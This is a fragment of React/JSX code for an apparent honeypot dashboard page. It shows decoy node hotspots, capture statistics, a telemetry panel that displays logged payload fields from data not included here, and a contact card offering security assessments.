                    </defs>
                    <rect width="100%" height="100%" fill="url(#grid)" />
                  </svg>

                  {/* Hotspot 1: Frankfurt */}
                  <button
                    onClick={() => setSelectedDecoy('Frankfurt')}
                    className={`absolute top-1/3 left-1/4 flex flex-col items-center group cursor-pointer transition-transform ${selectedDecoy === 'Frankfurt' ? 'scale-110 z-20' : 'z-10'}`}
                  >
                    <span className="w-4 h-4 rounded-full bg-[#d70015] animate-ping absolute opacity-75"></span>
                    <span className="w-3.5 h-3.5 rounded-full bg-[#d70015] relative shadow-sm ring-2 ring-white"></span>
                    <span className={`font-mono text-[10px] text-[#1d1d1f] font-semibold mt-1 px-1.5 py-0.5 rounded shadow-xs ${selectedDecoy === 'Frankfurt' ? 'bg-[#0071e3] text-white' : 'bg-white/95'}`}>
                      Frankfurt (SSH)
                    </span>
                  </button>

                  {/* Hotspot 2: Singapore */}
                  <button
                    onClick={() => setSelectedDecoy('Singapore')}
                    className={`absolute bottom-1/3 right-1/3 flex flex-col items-center group cursor-pointer transition-transform ${selectedDecoy === 'Singapore' ? 'scale-110 z-20' : 'z-10'}`}
                  >
                    <span className="w-4 h-4 rounded-full bg-[#f56300] animate-ping absolute opacity-75"></span>
                    <span className="w-3.5 h-3.5 rounded-full bg-[#f56300] relative shadow-sm ring-2 ring-white"></span>
                    <span className={`font-mono text-[10px] text-[#1d1d1f] font-semibold mt-1 px-1.5 py-0.5 rounded shadow-xs ${selectedDecoy === 'Singapore' ? 'bg-[#0071e3] text-white' : 'bg-white/95'}`}>
                      Singapore (HTTP)
                    </span>
                  </button>

                  {/* Hotspot 3: Tokyo */}
                  <button
                    onClick={() => setSelectedDecoy('Tokyo')}
                    className={`absolute top-1/2 right-1/4 flex flex-col items-center group cursor-pointer transition-transform ${selectedDecoy === 'Tokyo' ? 'scale-110 z-20' : 'z-10'}`}
                  >
                    <span className="w-3 h-3 rounded-full bg-[#0071e3] relative shadow-sm ring-2 ring-white"></span>
                    <span className={`font-mono text-[10px] text-[#1d1d1f] font-semibold mt-1 px-1.5 py-0.5 rounded shadow-xs ${selectedDecoy === 'Tokyo' ? 'bg-[#0071e3] text-white' : 'bg-white/95'}`}>
                      Tokyo (Telnet)
                    </span>
                  </button>

                  {/* Hotspot 4: US-East */}
                  <button
                    onClick={() => setSelectedDecoy('US-East')}
                    className={`absolute top-1/4 left-1/3 flex flex-col items-center group cursor-pointer transition-transform ${selectedDecoy === 'US-East' ? 'scale-110 z-20' : 'z-10'}`}
                  >
                    <span className="w-3 h-3 rounded-full bg-[#0077ed] relative shadow-sm ring-2 ring-white"></span>
                    <span className={`font-mono text-[10px] text-[#1d1d1f] font-semibold mt-1 px-1.5 py-0.5 rounded shadow-xs ${selectedDecoy === 'US-East' ? 'bg-[#0071e3] text-white' : 'bg-white/95'}`}>
                      US-East (API)
                    </span>
                  </button>
                </div>

                {/* Decoy Capture Stats */}
                <div className="grid grid-cols-3 gap-3 pt-2 z-10 border-t border-[#e5e5ea]/80">
                  <div>
                    <span className="text-[11px] text-[#86868b] font-medium uppercase">Exploits Caught</span>
                    <p className="text-xl sm:text-2xl font-bold text-[#1d1d1f]">12,480</p>
                  </div>
                  <div>
                    <span className="text-[11px] text-[#86868b] font-medium uppercase">Unique Actors</span>
                    <p className="text-xl sm:text-2xl font-bold text-[#0071e3]">843</p>
                  </div>
                  <div>
                    <span className="text-[11px] text-[#86868b] font-medium uppercase">Zero-Days</span>
                    <p className="text-xl sm:text-2xl font-bold text-[#d70015]">4 Isolated</p>
                  </div>
                </div>
              </div>

              {/* Decoy Shell Payload Log */}
              <div className="rounded-xl bg-[#fbfbfd] border border-[#e5e5ea] p-4 flex flex-col justify-between shadow-xs font-mono">
                <div className="flex flex-col gap-2">
                  <div className="flex items-center justify-between pb-1.5 border-b border-[#e5e5ea]">
                    <span className="text-[11px] text-[#86868b] font-bold uppercase">
                      TELEMETRY CAPTURE
                    </span>
                    <span className="text-[11px] text-[#0071e3] font-semibold">
                      {decoyLogs[selectedDecoy].node}
                    </span>
                  </div>

                  <div className="p-3 rounded-lg bg-white border border-[#e5e5ea] text-[11.5px] text-[#424245] flex flex-col gap-1 shadow-xs">
                    <span className="text-[#86868b] italic"># Auth Attempt:</span>
                    <span className="text-[#1d1d1f] font-medium">user: "{decoyLogs[selectedDecoy].user}"</span>
                    <span className="text-[#1d1d1f] font-medium">pass: "{decoyLogs[selectedDecoy].pass}"</span>

                    <span className="text-[#28cd41] font-semibold mt-1.5"># Injected Payload:</span>
                    <span className="text-[#d70015] font-semibold break-all">
                      {decoyLogs[selectedDecoy].cmd}
                    </span>

                    <span className="text-[#86868b] italic mt-1.5"># Sandbox Action:</span>
                    <span className="text-[#6e6e73]">
                      {decoyLogs[selectedDecoy].action}
                    </span>

                    <span className="text-[10px] text-[#86868b] mt-1 pt-1 border-t border-[#f0f0f2]">
                      Source: {decoyLogs[selectedDecoy].ip}
                    </span>
                  </div>
                </div>

                <div className="pt-3 flex items-center justify-between text-[11px]">
                  <span className="text-[#86868b] font-medium">Node Auto-Cycle: 6 hrs</span>
                  <span className="px-2 py-0.5 rounded bg-[#f5f5f7] border border-[#e5e5ea] text-[#6e6e73] font-medium">
                    Low-Interaction
                  </span>
                </div>
              </div>
            </div>
          </section>
        )}

        {/* Lab Environment & Technical Brief Action Card */}
        <div className="rounded-2xl bg-gradient-to-r from-[#f5f5f7] via-white to-[#f5f5f7] border border-[#e5e5ea] p-6 sm:p-8 flex flex-col md:flex-row items-center justify-between gap-6 shadow-sm">
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 rounded-full bg-[#0071e3]/10 border border-[#0071e3]/20 flex items-center justify-center shrink-0">
              <span className="material-symbols-outlined text-[#0071e3] text-[26px]">
                terminal
              </span>
            </div>
            <div className="flex flex-col">
              <h3 className="text-lg sm:text-xl font-bold text-[#1d1d1f]">
                Need a custom security assessment or binary audit?
              </h3>
              <p className="text-[13.5px] text-[#6e6e73] mt-0.5">
                Explore source architecture, verified exploit write-ups, and reproducible virtualized testbeds.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-3 shrink-0 w-full md:w-auto">
            <button
              onClick={() => onTabChange('contact')}
              className="w-full md:w-auto px-6 py-2.5 rounded-full bg-[#0071e3] text-white text-[13.5px] font-medium hover:bg-[#0077ed] transition-all shadow-sm"
            >
              Request Technical Brief
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};
